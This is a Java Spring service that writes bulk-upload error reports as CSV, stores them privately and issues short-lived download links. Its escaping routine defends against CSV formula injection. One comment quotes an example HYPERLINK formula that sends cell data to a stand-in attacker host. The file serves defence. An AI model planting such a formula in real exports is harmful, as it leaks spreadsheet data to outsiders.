package com.perimity.campus.service;

import com.perimity.campus.dto.request.BulkErrorReportDto;
import com.perimity.campus.dto.response.BulkErrorReportResponse;
import com.perimity.campus.entity.Campus;
import com.perimity.campus.exception.ResourceNotFoundException;
import com.perimity.campus.repository.CampusRepository;
import com.perimity.campus.storage.StorageKeys;
import com.perimity.campus.storage.StorageService;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

/**
 * The bulk-upload error report (Day 10, FR-BULK-9).
 *
 * A faculty member uploads 600 rows and 20 fail. Telling them "20 errors" is
 * useless - they need to know WHICH rows, so they can fix those twenty and
 * re-upload only those. Event_Bulk_Design.md is specific about the shape:
 * "row 34: invalid email", "row 51: duplicate".
 *
 * CSV rather than XLSX, deliberately. The uploader opens this in the same
 * spreadsheet program they built the sheet in, and CSV needs no library, no
 * POI dependency here, and no version negotiation. The trade is that CSV has
 * no types - which is exactly why the injection defence below matters.
 */
@Service
public class BulkErrorReportService {

    private static final Logger log = LoggerFactory.getLogger(BulkErrorReportService.class);

    /**
     * Excel reads a bare UTF-8 file as the local 8-bit codepage, so a name like
     * "Aravindhan Ranganathan" survives but "Zoë" or any Devanagari name does
     * not - it renders as mojibake and the uploader concludes the system
     * mangled their data. Three bytes fix it. The validation rules elsewhere in
     * this project deliberately accept Unicode names, so the report has to be
     * able to print them back.
     */
    private static final byte[] UTF8_BOM = {(byte) 0xEF, (byte) 0xBB, (byte) 0xBF};

    private static final String HEADER = "Row,Email,Problem";

    private final CampusRepository campusRepository;
    private final StorageService storage;
    private final int presignMinutes;

    public BulkErrorReportService(CampusRepository campusRepository,
                                  StorageService storage,
                                  @Value("${perimity.storage.presign-minutes}") int presignMinutes) {
        this.campusRepository = campusRepository;
        this.storage = storage;
        this.presignMinutes = presignMinutes;
    }

    /**
     * Render and store. Called by gatepass-service when validation finishes.
     *
     * The key is deterministic, so re-validating the same batch overwrites its
     * report instead of leaving an orphan. That also makes this safely
     * repeatable: a retried call produces the same key and the same file.
     */
    @Transactional(readOnly = true)
    public BulkErrorReportResponse store(Long campusId, Long batchId, BulkErrorReportDto dto) {
        Campus campus = requireCampus(campusId);

        byte[] csv = render(dto);
        String key = StorageKeys.bulkErrorReport(campus.getCode(), batchId);

        storage.put(key, new ByteArrayInputStream(csv), csv.length, "text/csv; charset=utf-8");

        log.info("Stored error report for campus {} batch {}: {} rows, {} bytes",
                campus.getCode(), batchId, dto.getRows().size(), csv.length);

        return BulkErrorReportResponse.stored(key, dto.getRows().size());
    }

    /**
     * A short-lived link for the uploader.
     *
     * Same pattern as the campus logo: the bucket stays private and a signed URL
     * is minted on demand. An error report contains the email addresses of
     * people who failed to register - a permanent public URL for that cannot be
     * un-shared once it leaks.
     */
    @Transactional(readOnly = true)
    public BulkErrorReportResponse downloadUrl(Long campusId, Long batchId) {
        Campus campus = requireCampus(campusId);
        String key = StorageKeys.bulkErrorReport(campus.getCode(), batchId);

        if (!storage.exists(key)) {
            // Genuinely absent, and that is usually good news - a batch with no
            // failed rows has no report. Distinguishing it from an error matters
            // because the UI shows a download button either way.
            throw new ResourceNotFoundException(
                    "No error report exists for batch " + batchId
                            + ". Either every row was valid, or the batch has not been validated yet.");
        }

        return BulkErrorReportResponse.downloadable(
                key, storage.presignedReadUrl(key, Duration.ofMinutes(presignMinutes)));
    }

    // ----------------------------------------------------------- rendering

    private byte[] render(BulkErrorReportDto dto) {
        StringBuilder sb = new StringBuilder(dto.getRows().size() * 48);
        sb.append(HEADER).append("\r\n");

        for (BulkErrorReportDto.RowError row : dto.getRows()) {
            sb.append(row.getRowNumber()).append(',')
              .append(csv(row.getEmail())).append(',')
              .append(csv(row.getMessage())).append("\r\n");
        }

        byte[] body = sb.toString().getBytes(StandardCharsets.UTF_8);
        byte[] out = new byte[UTF8_BOM.length + body.length];
        System.arraycopy(UTF8_BOM, 0, out, 0, UTF8_BOM.length);
        System.arraycopy(body, 0, out, UTF8_BOM.length, body.length);
        return out;
    }

    /**
     * One CSV cell, escaped and de-fanged.
     *
     * TWO SEPARATE PROBLEMS, and only the first is obvious.
     *
     * 1. CSV escaping. A value containing a comma, a quote or a newline breaks
     *    the row apart unless it is quoted and its own quotes doubled. An email
     *    will not contain those; a free-text message written by a teammate
     *    eventually will.
     *
     * 2. CSV INJECTION, which is the one worth knowing about. Excel and Sheets
     *    treat a cell beginning with = + - or @ as a FORMULA, not text. Every
     *    value in this file originates in a spreadsheet an outsider uploaded,
     *    so a row whose name field is
     *        =HYPERLINK("http://evil.example.com?d="&A1,"Click")
     *    becomes a live formula the moment a Campus Admin opens the report we
     *    generated and handed them. Prefixing with a single quote makes Excel
     *    treat it as text, and the apostrophe is not displayed.
     *
     *    This is the same class of bug as trusting an uploaded file's declared
     *    content type: the danger is not in our system, it is in what our
     *    output makes someone else's system do.
     */
    private String csv(String value) {
        if (value == null || value.isBlank()) {
            return "";
        }
        String v = value.trim();

        if (v.startsWith("=") || v.startsWith("+") || v.startsWith("-")
                || v.startsWith("@") || v.startsWith("\t") || v.startsWith("\r")) {
            v = "'" + v;
        }

        if (v.contains(",") || v.contains("\"") || v.contains("\n") || v.contains("\r")) {
            v = "\"" + v.replace("\"", "\"\"") + "\"";
        }
        return v;
    }

    private Campus requireCampus(Long campusId) {
        return campusRepository.findById(campusId)
                .orElseThrow(() -> ResourceNotFoundException.of("Campus", campusId));
    }
}
